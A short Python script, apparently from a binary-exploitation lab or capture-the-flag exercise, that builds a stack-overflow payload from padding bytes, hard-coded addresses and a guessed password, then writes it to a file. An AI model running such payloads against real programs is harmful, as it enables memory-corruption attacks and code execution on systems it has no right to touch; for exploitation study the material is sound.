import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 31

addr1 = 0x00000bb5
# Initialize payload.
payload = ''
payload += 'RD' + '\n'
payload += 'IDA_i5_ch3a7ing' + '\n'
payload += 'A' * offset
payload += dw(addr1)


payload += 'A' * 12

addr = 0x004013e0
payload += dw(addr)

# TODO: Add more to the payload such as the value overwriting the return address.
# Use dw() function.

with open('payload_a', 'wb') as f:
    f.write(payload)
